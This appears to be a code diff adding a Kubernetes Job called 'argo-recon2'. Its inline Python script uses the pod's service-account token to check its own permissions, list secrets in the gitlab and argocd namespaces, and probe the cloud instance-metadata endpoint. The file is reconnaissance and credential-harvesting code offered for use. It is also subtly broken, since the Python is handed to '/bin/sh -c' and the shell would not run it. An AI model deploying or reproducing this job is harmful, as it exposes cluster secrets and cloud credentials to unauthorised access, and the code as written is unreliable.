@@ -1,0 +1,44 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: argo-recon2
+  namespace: argo-marker-test
+spec:
+  ttlSecondsAfterFinished: 600
+  template:
+    spec:
+      restartPolicy: Never
+      containers:
+      - name: recon
+        image: python:3.12-alpine
+        command: ["/bin/sh","-c"]
+        args:
+        - |
+          import urllib.request, ssl, json
+          SA="/var/run/secrets/kubernetes.io/serviceaccount"
+          tok=open(SA+"/token").read().strip()
+          ctx=ssl.create_default_context(cafile=SA+"/ca.crt")
+          def req(path, body=None, hdrs=None):
+              h={"Authorization":"Bearer "+tok}; h.update(hdrs or {})
+              r=urllib.request.Request("https://kubernetes.default.svc"+path, data=body, headers=h, method="POST" if body else "GET")
+              try:
+                  resp=urllib.request.urlopen(r, context=ctx, timeout=10)
+                  return resp.status, resp.read()[:3000].decode(errors="replace")
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read()[:1500].decode(errors="replace")
+          print("== selfsubjectrulesreview gitlab ==")
+          b=json.dumps({"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"gitlab"}}).encode()
+          st,bd=req("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", b, {"Content-Type":"application/json"})
+          print(st,bd[:2200])
+          print("== list secrets gitlab ==")
+          st,bd=req("/api/v1/namespaces/gitlab/secrets?limit=10")
+          print(st,bd[:1200])
+          print("== list secrets argocd ==")
+          st,bd=req("/api/v1/namespaces/argocd/secrets?limit=10")
+          print(st,bd[:1200])
+          print("== IMDS probe ==")
+          try:
+              r=urllib.request.urlopen("http://169.254.169.254/latest/meta-data/", timeout=4)
+              print(r.status, r.read()[:200].decode(errors="replace"))
+          except Exception as e:
+              print("IMDS:", e)
